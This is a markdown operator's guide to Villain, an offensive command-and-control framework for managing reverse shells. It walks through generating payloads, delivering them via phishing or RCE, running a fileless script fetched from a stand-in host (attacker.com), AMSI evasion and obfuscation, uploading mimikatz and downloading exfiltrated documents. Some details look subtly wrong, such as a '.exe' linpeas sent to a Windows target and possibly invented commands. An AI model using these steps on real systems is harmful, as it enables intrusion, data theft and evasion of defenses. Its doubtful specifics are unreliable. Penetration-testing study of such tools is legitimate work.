---
tool_name: "villain"
display_name: "Villain"
mitre_tactic: "command_and_control"
mitre_tactic_id: "TA0011"
mitre_subcategory: "c2_frameworks"
install_command: "sudo apt install villain"
version: "2.2.1"
github_repo: "https://github.com/t3l3machus/Villain"
kali_tools_page: "https://www.kali.org/tools/villain/"
difficulty_level: "intermediate"
requires_root: true
gui_available: false
tags: ["c2", "reverse-shell", "hoaxshell", "multiplayer", "conpty", "file-upload"]
related_tools: ["hoaxshell", "netcat", "socat", "metasploit-framework"]
---

# Villain

## Chapter 1: Introduction & Overview

### What is Villain?
Villain is a high-level Stage 0/1 C2 framework that can handle multiple reverse TCP and HoaxShell-based shells, enhance their functionality with additional features (commands, utilities), and share them among connected sibling servers (Villain instances running on different machines). It provides payload generation, a dynamic pseudo-shell prompt, file uploads, fileless script execution, and automatic ConPtyShell invocation for fully interactive Windows shells.

### History & Background
- **Created:** 2022 by t3l3machus
- **Maintained:** Active project (4.4k stars, 692 forks)
- **License:** CC BY-NC 4.0
- **Purpose:** Multi-shell C2, HoaxShell-based operations, team collaboration

Villain extends HoaxShell's capabilities by providing a full C2 framework with multiplayer support, session management, and additional post-exploitation features. It is designed for quick engagements and team operations where multiple operators need to share shells.

### When to Use This Tool
- **Penetration testing:** Managing multiple reverse shells
- **Red team operations:** Team-based shell management with shared sessions
- **Quick engagements:** Fast payload generation and handler setup
- **AV evasion:** Using HoaxShell-based payloads for HTTP(S) C2

### When NOT to Use This Tool
- Without explicit written authorization from the target organization
- On production systems without proper planning
- When a full-featured C2 framework is required (use Empire, Havoc, etc.)
- For Linux-only operations (primarily Windows-focused)

### Legal and Ethical Considerations
- **Always obtain written permission** before deploying shells
- **Understand the scope** - know exactly what systems you are authorized to access
- **Use obfuscation** - default payloads may be detected by AMSI
- **Document all activity** - maintain records of all access obtained
- **Clean up** - remove all artifacts after engagement completion

### Key Concepts
- **Sibling Server:** Another Villain instance that shares shells
- **ConPtyShell:** Fully interactive Windows shell using ConPTY
- **Session Defender:** Feature that inspects commands for mistakes that may hang the shell
- **File Smuggler:** HTTP-based file upload server
- **Multiplayer Mode:** Multiple operators sharing the same Villain instance

---

## Chapter 2: Installation & Setup

### System Requirements
- **Minimum RAM:** 1 GB
- **Disk Space:** 200 MB
- **Network:** HTTP(S) connectivity to targets
- **Privileges:** Root required
- **Python:** 3.x
- **Additional:** gnome-terminal (for some commands)

### Installation Methods

#### Method 1: APT (Recommended)
```bash
sudo apt update
sudo apt install villain
```

#### Method 2: From Source
```bash
git clone https://github.com/t3l3machus/Villain.git
cd Villain
pip3 install -r requirements.txt
sudo apt install gnome-terminal
```

### Dependencies
- Python 3.x
- netifaces
- pycryptodome
- pyperclip
- requests
- gnome-terminal

### Starting Villain
```bash
# Start Villain with default settings
sudo villain

# Start with custom ports
sudo villain -p 6501 -x 8080 -n 4443 -f 8888
```

---

## Chapter 3: Core Concepts

### Architecture Overview
Villain uses a modular architecture:
- **C2 Server:** Main server managing all operations
- **HoaxShell Server:** HTTP(S) listener for HoaxShell-based payloads
- **Reverse TCP Handler:** Multi-handler for traditional reverse shells
- **File Smuggler:** HTTP server for file uploads
- **Sibling Servers:** Connected Villain instances sharing shells

### Communication Flow
```
Operator -> Villain Server -> HoaxShell/Reverse TCP -> Target (Shell)
Target (Shell) -> Villain Server -> Operator
```

### Shell Types
- **HoaxShell-based:** HTTP(S) pseudo-shells using HoaxShell payloads
- **Reverse TCP:** Traditional reverse shells (netcat, PowerShell, etc.)
- **ConPtyShell:** Fully interactive Windows shells (auto-invoked on PowerShell sessions)

### Session Management
- **Dynamic prompt:** Pseudo-shell prompt that shows current session
- **Session switching:** Quick switch between active sessions
- **Session sharing:** Share sessions with sibling servers
- **Session Defender:** Prevents commands that may hang the shell

---

## Chapter 4: Basic Usage

### Starting Villain
```bash
# Start with default settings
sudo villain

# Output shows:
# Team Server port: 6501
# HoaxShell server port: 8080
# Reverse TCP multi-handler port: 4443
# File Smuggler port: 8888
```

### Generating Payloads
```bash
# In the Villain console:
Villain > generate

# Select payload type:
# 1. HoaxShell (HTTP)
# 2. HoaxShell (HTTPS)
# 3. Reverse TCP (PowerShell)
# 4. Reverse TCP (netcat)
# 5. Custom template

# Copy the generated payload and execute on target
```

### Managing Sessions
```bash
# List active sessions
Villain > sessions

# Interact with a session
Villain > shell <session_id>

# Switch between sessions
Villain > shell <session_id1>
Villain > shell <session_id2>

# Background a session
Villain > background
```

### Executing Commands
```bash
# Once in a shell session:
Villain (session: <id>) > whoami
Villain (session: <id>) > hostname
Villain (session: <id>) > ipconfig
Villain (session: <id>) > dir C:\Users
```

---

## Chapter 5: Advanced Usage

### File Operations
```bash
# Upload a file to target
Villain (session: <id>) > upload /path/to/local/file C:\temp\remote_file

# Download a file from target
Villain (session: <id>) > download C:\Users\target\file.txt /path/to/local/file.txt

# List files on target
Villain (session: <id>) > ls C:\Users
```

### Fileless Script Execution
```bash
# Execute a script in memory
Villain (session: <id>) > fileless_ps <script_content>

# Execute a script from URL
Villain (session: <id>) > fileless_ps_url http://attacker.com/script.ps1
```

### ConPtyShell Integration
```bash
# Automatically invoked for PowerShell reverse shells
# Provides fully interactive Windows shell with:
# - Tab completion
# - Arrow key navigation
# - Ctrl+C support
# - Proper terminal emulation
```

### Multiplayer Mode
```bash
# Connect to a sibling server
Villain > sibling <server_ip> <port>

# Share shells with the sibling
Villain > share <session_id> <sibling_ip>

# View shared shells
Villain > shared_sessions
```

### Session Defender
```bash
# Session Defender inspects commands for:
# - Commands that may hang the shell
# - Dangerous commands
# - Mistyped commands

# Enable/disable
Villain > session_defender on
Villain > session_defender off
```

---

## Chapter 6: Integration & Automation

### Custom Payload Templates
```bash
# Create custom payload templates
# Place in Villain/Core/payload_templates/

# Template variables:
# {{SERVER_IP}} - Server IP address
# {{SERVER_PORT}} - Server port
# {{SESSION_ID}} - Unique session ID
```

### Scripting Villain
```bash
# Automate common tasks
# 1. Generate payload
Villain > generate

# 2. Wait for session
Villain > listen

# 3. Execute recon
Villain (session: <id>) > sysinfo
Villain (session: <id>) > whoami
```

### Integration with Other Tools
- **HoaxShell:** Uses HoaxShell as the underlying C2 for HTTP(S) shells
- **Netcat:** Support for traditional netcat reverse shells
- **Metasploit:** Use Metasploit for initial access, Villain for shell management
- **Custom tools:** Extend functionality through custom payloads and modules

### Sibling Server Communication
```bash
# Start a sibling server on another machine
sudo villain -p 6501

# Connect from main server
Villain > sibling <sibling_ip> 6501

# Verify connection
Villain > siblings
```

---

## Chapter 7: OPSEC & Defense Evasion

### Payload Obfuscation
```bash
# Default payloads may be detected by AMSI
# Create custom obfuscated templates:

# 1. Use string concatenation
# 2. Use environment variables
# 3. Use encoding/decoding
# 4. Use Invoke-Obfuscation

# Example obfuscation:
$ip = "192.168.1.100"
$port = "8080"
$url = "http://" + $ip + ":" + $port
# ... (rest of payload with obfuscation)
```

### Evasion Techniques
- **HTTPS with trusted certs:** Use valid SSL certificates
- **Custom headers:** Set realistic HTTP headers
- **Sleep intervals:** Mimic legitimate traffic patterns
- **Process injection:** Inject into legitimate processes
- **Fileless execution:** Avoid writing to disk

### Best Practices
1. Always obfuscate payloads before deployment
2. Use HTTPS with valid certificates when possible
3. Implement sleep jitter to avoid pattern detection
4. Monitor for detection and adapt
5. Use the `-g` option for session restoration

### Common Detection Methods
- AMSI detection of PowerShell payloads
- Network traffic analysis (HTTP patterns)
- Process creation monitoring
- File system monitoring

---

## Chapter 8: Troubleshooting & FAQ

### Common Issues

**Problem: Villain won't start**
```bash
# Check Python version
python3 --version

# Install dependencies
pip3 install -r requirements.txt

# Check port availability
netstat -tlnp | grep 6501
netstat -tlnp | grep 8080

# Check gnome-terminal
which gnome-terminal
```

**Problem: Payload doesn't connect**
- Verify the listener is running on the correct port
- Check firewall rules
- Ensure the payload is executed correctly
- Test network connectivity

**Problem: Shell hangs**
- Use Session Defender to prevent hanging commands
- Don't run interactive commands (use non-interactive alternatives)
- Check the sleep interval

**Problem: ConPtyShell fails**
- Verify the target is Windows
- Check that PowerShell is available
- Ensure the session is PowerShell-based

**Problem: Sibling server connection fails**
- Verify the sibling server is running
- Check firewall rules on port 6501
- Ensure the IP/port are correct

### Debug Mode
```bash
# Start Villain with verbose output
sudo villain -v

# Check logs
tail -f /var/log/villain.log
```

---

## Chapter 9: Real-World Scenarios

### Quick Engagement Workflow

```bash
# 1. Start Villain
sudo villain

# 2. Generate HTTPS HoaxShell payload
Villain > generate
# Select: HoaxShell (HTTPS)
# Copy the generated payload

# 3. Deliver payload (e.g., via phishing or RCE)
# On target: paste and execute the PowerShell payload

# 4. Interact with session
Villain > sessions
Villain > shell <session_id>

# 5. Enumerate
Villain (session: <id>) > whoami
Villain (session: <id>) > hostname
Villain (session: <id>) > ipconfig /all
Villain (session: <id>) > net user
Villain (session: <id>) > net localgroup administrators

# 6. Transfer tools
Villain (session: <id>) > upload /tmp/linpeas.exe C:\temp\linpeas.exe
```

### Team Engagement with Sibling Servers

```bash
# Operator 1 (Team Lead)
sudo villain -p 6501
# Generate payload and share with team

# Operator 2 (Secondary)
sudo villain -p 6502
# Connect to team lead's server
Villain > sibling 192.168.1.100 6501

# Share shells between operators
Villain > share <session_id> 192.168.1.101
```

### ConPtyShell for Fully Interactive Windows Shell

```bash
# Generate a PowerShell reverse shell payload
Villain > generate
# Select: Reverse TCP (PowerShell)

# When the shell connects, Villain automatically invokes ConPtyShell
# This provides a fully interactive Windows shell with:
# - Tab completion
# - Arrow key navigation
# - Ctrl+C support
# - Proper terminal emulation

# Test the interactivity
Villain (session: <id>) > powershell
PS C:\Users\target> Get-Process
PS C:\Users\target> cd C:\Windows
PS C:\Windows> dir
```

### File Smuggler for Payload Delivery

```bash
# Upload a file to the target
Villain (session: <id>) > upload /tmp/mimikatz.exe C:\temp\mimikatz.exe

# Download exfiltrated data
Villain (session: <id>) > download C:\Users\target\Documents\secrets.docx /tmp/secrets.docx

# Use the File Smuggler HTTP server
# The File Smuggler runs on port 8888 by default
# Access files at http://VILLAIN_IP:8888/
```

---

## Chapter 10: Command Reference

### Console Commands

| Command | Description |
|---|---|
| `generate` | Generate a new payload |
| `sessions` | List all active sessions |
| `shell <id>` | Interact with a session |
| `background` | Background the current session |
| `sibling <ip> <port>` | Connect to a sibling server |
| `share <id> <ip>` | Share a session with a sibling |
| `shared_sessions` | View shared sessions |
| `session_defender on/off` | Toggle Session Defender |
| `sysinfo` | Get target system info |

### Shell Commands (Inside a Session)

| Command | Description |
|---|---|
| `whoami` | Current user context |
| `hostname` | Target hostname |
| `ipconfig` | Network configuration |
| `upload <local> <remote>` | Upload file to target |
| `download <remote> <local>` | Download file from target |
| `ls <path>` | List directory contents |
| `fileless_ps <script>` | Execute PowerShell in memory |
| `sysinfo` | System information |
| `background` | Return to main console |

---

## Resources

- **GitHub Repository:** https://github.com/t3l3machus/Villain
- **Kali Tools Page:** https://www.kali.org/tools/villain/
- **Usage Guide:** https://github.com/t3l3machus/Villain/blob/main/Usage_Guide.md
- **HoaxShell:** https://github.com/t3l3machus/hoaxshell
- **MITRE ATT&CK - Command and Control:** https://attack.mitre.org/tactics/TA0011/
- **MITRE ATT&CK - Application Layer Protocol:** https://attack.mitre.org/techniques/T1071/
- **MITRE ATT&CK - Ingress Tool Transfer:** https://attack.mitre.org/techniques/T1105/
- **Related Tools:** HoaxShell, Netcat, Metasploit Framework
